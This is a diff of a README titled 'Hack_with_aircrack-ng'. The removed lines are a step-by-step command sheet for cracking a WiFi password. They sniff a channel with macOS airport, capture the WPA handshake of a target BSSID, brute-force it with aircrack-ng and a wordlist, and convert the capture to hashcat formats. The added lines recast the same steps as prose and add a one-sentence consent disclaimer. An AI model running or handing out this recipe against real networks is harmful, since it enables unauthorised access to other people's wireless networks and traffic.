@@ -1,37 +1,19 @@
 # Hack_with_aircrack-ng
 
-_______Part #1 - aircrack-ng ______
+This process describes a set of commands used to crack a WiFi password using two different tools, aircrack-ng and hashcat. The process involves the following steps:
 
--- Look for wifi --
-airport -s
+Part #1 - aircrack-ng:
 
--- Look disable --
-sudo airport -z
+- Look for available wifi networks.
+- Disable wifi.
+- Sniff wifi packets on a specific channel.
+- Look for the password handshake of the target network.
+- Start the cracking process using a wordlist and the captured password handshake.
+- Convert the captured handshake file to hccap or hccapx format, which is compatible with hashcat.
 
--- Sniff wifi interface + kanal --
-sudo airport en0 sniff 6
+Part #2 - Hashcat:
 
--- Look for handshake --
-aircrack-ng /tmp/airportSniffQ2qvVj.cap
+- Convert the hccapx file to the hc22000 format using an online converter or hcxpcapngtool command.
+- Use hashcat to crack the password using the hc22000 file and a wordlist.
 
--- Start crack --
-aircrack-ng -w wordlist.txt -b 6A:41:47:CF:3E:9C /tmp/airportSniffQ2qvVj.cap
-
--- Make hccap --
-aircrack-ng -b 6A:41:47:CF:3E:9C -J name  /tmp/airportSniffQ2qvVj.cap
-
--- Make hccapx --
-aircrack-ng -b 6A:41:47:CF:3E:9C -j name  /tmp/airportSniffQ2qvVj.cap
-
-_______Part #2 - Hashcat ______
-
--- Convert to hc22000 website --
-https://hashcat.net/cap2hccapx/
-
--- Convert to hc22000 --
-hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng
-
-
-____________________
-Test
-____________________
+It is important to note that these tools should only be used for ethical purposes and with the consent of the network owner.
